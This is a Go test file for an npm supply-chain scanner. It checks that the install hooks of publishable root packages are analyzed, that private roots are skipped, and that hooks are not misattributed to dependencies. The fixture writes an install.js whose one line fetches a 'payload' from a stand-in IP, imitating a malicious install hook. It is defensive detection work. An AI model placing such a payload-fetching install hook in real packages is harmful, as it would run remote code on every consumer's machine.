package npm_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/npm"
	"ihbv.io/depsnort/internal/graph"
)

// OPU-38 (found via the Medium/phantomjs repo scan): the root project's own
// install scripts were not analyzed for publishable packages. This is correct
// for applications ("private": true — their postinstall is build tooling), but
// wrong for published npm packages whose install hook runs on every consumer's
// machine when they `npm install` the package. A root node created from a bare
// package.json (no lockfile) has no npm.path attribute, which caused
// ExtractInstallSurface's main loop to silently skip it.

func buildPublishableRootFixture(t *testing.T, scripts map[string]string, private bool) string {
	t.Helper()
	dir := t.TempDir()
	manifest := map[string]any{
		"name":    "my-publishable-pkg",
		"version": "1.0.0",
		"scripts": scripts,
	}
	if private {
		manifest["private"] = true
	}
	b, err := json.Marshal(manifest)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	// Write the script file that install.js would reference.
	if err := os.WriteFile(filepath.Join(dir, "install.js"),
		[]byte(`var request = require('request'); request.get('https://203.0.113.1/payload');`),
		0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// TestOPU38PublishableRootInstallHookAnalyzed verifies that a root package
// without "private": true gets its install scripts analyzed — the phantom case.
func TestOPU38PublishableRootInstallHookAnalyzed(t *testing.T) {
	dir := buildPublishableRootFixture(t, map[string]string{
		"install": "node install.js",
	}, false /* not private */)

	g := graph.New()
	a := &npm.Adapter{}
	// Simulate what the adapter builds during manifest resolution: a root node
	// with the package's purl, registered as a graph root, but without npm.path
	// (the no-lockfile code path).
	rootID := "pkg:npm/my-publishable-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID:        rootID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "my-publishable-pkg",
		Version:   "1.0.0",
		Depth:     0,
		Attr:      map[string]string{"npm.source": "package.json"}, // no npm.path
	})
	g.MarkRoot(rootID)

	if err := a.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	// At minimum, a CapExec or CapNetwork hook node should exist on the root node.
	foundHook := false
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == rootID {
			foundHook = true
			break
		}
	}
	if !foundHook {
		t.Error("expected at least one hook node attributed to the publishable root package after OPU-38, found none")
	}
}

// TestOPU38PrivateRootNotAnalyzed verifies that "private": true application
// roots are excluded — the FP-prevention condition.
func TestOPU38PrivateRootNotAnalyzed(t *testing.T) {
	dir := buildPublishableRootFixture(t, map[string]string{
		"postinstall": "next build", // typical application build step
	}, true /* private */)

	g := graph.New()
	a := &npm.Adapter{}
	rootID := "pkg:npm/my-app@1.0.0"
	g.AddNode(&graph.Node{
		ID:        rootID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "my-app",
		Version:   "1.0.0",
		Depth:     0,
		Attr:      map[string]string{"npm.source": "package.json"},
	})
	g.MarkRoot(rootID)

	if err := a.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == rootID {
			t.Error("did not expect hook nodes for a private (application) root package — would FP on build tooling")
			break
		}
	}
}

// TestOPU38LockfileRootNotDuplicated verifies that a root node that already has
// npm.path (lockfile path — already analyzed in the main loop) is not double-
// analyzed by the OPU-38 section.
// TestOPU38LockfileRootNotDuplicated is a WEAK regression: graph.AddNode and
// graph.AddEdge are both idempotent by ID (confirmed by reading graph.go),
// so re-running Analyze/addSurfaceToGraph on an already-handled root would
// converge to the same single hook node regardless of whether the OPU-38
// section's own npm.path guard exists — this assertion cannot, by itself,
// prove the guard does anything (verified: removing the guard from
// installsurface.go leaves this specific test passing). The guard is real
// and worth keeping anyway, purely as a performance optimization (it skips a
// redundant package.json read + re-parse + re-analysis on every scan of an
// already-lockfile-resolved root) — but that's not what this assertion can
// show. See TestOPU38DoesNotMisattributeToNonRootNodes below for the guard
// this package's mutation-proofing actually found to be load-bearing.
func TestOPU38LockfileRootNotDuplicated(t *testing.T) {
	dir := buildPublishableRootFixture(t, map[string]string{
		"install": "node install.js",
	}, false)

	g := graph.New()
	a := &npm.Adapter{}
	rootID := "pkg:npm/my-publishable-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID:        rootID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "my-publishable-pkg",
		Version:   "1.0.0",
		Depth:     0,
		// Has npm.path — simulates lockfile-resolved root (already handled in main loop)
		Attr: map[string]string{"npm.path": "."},
	})
	g.MarkRoot(rootID)

	if err := a.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	// Count hook nodes — should be analyzed once, not twice.
	hookCount := 0
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == rootID {
			hookCount++
		}
	}
	if hookCount > 1 {
		t.Errorf("expected at most 1 hook node for lockfile-path root (already handled), got %d", hookCount)
	}
}

// TestOPU38DoesNotMisattributeToNonRootNodes covers the guard mutation-
// proofing found to be the genuinely load-bearing one (the roots[n.ID] check
// in installsurface.go, not the npm.path check TestOPU38LockfileRootNotDuplicated
// above claims to cover but structurally cannot).
//
// A yarn.lock-resolved graph is the real shape that exercises this: per
// yarn.go's own documented design, a yarn tree records no on-disk
// node_modules path for its DEPENDENCY nodes either ("a yarn tree
// contributes no npm.path and surfaces as source-unavailable"), so a
// dependency node with an empty npm.path sits in the SAME graph as a
// root with an empty npm.path — the exact scenario where reading
// absRoot/package.json for every npm.path-less node (rather than only
// registered graph roots) would misattribute the ROOT project's own install
// scripts to an unrelated dependency's hook.package. Confirmed by mutation:
// removing the `if !roots[n.ID] { continue }` guard makes this test fail —
// the dependency node gains a hook node sourced from the root's install.js.
func TestOPU38DoesNotMisattributeToNonRootNodes(t *testing.T) {
	dir := buildPublishableRootFixture(t, map[string]string{
		"install": "node install.js",
	}, false)

	g := graph.New()
	a := &npm.Adapter{}
	rootID := "pkg:npm/my-publishable-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID:        rootID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "my-publishable-pkg",
		Version:   "1.0.0",
		Depth:     0,
		Attr:      map[string]string{"npm.source": "package.json"}, // no npm.path
	})
	g.MarkRoot(rootID)

	// A dependency node with no npm.path, NOT a root — the yarn.lock shape.
	depID := "pkg:npm/some-dependency@2.0.0"
	g.AddNode(&graph.Node{
		ID:        depID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "some-dependency",
		Version:   "2.0.0",
		Depth:     1,
		Attr:      map[string]string{"npm.source": "yarn.lock"}, // no npm.path, not a root
	})

	if err := a.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == depID {
			t.Errorf("dependency node must not gain a hook from the root's install.js: %+v", n)
		}
	}
}
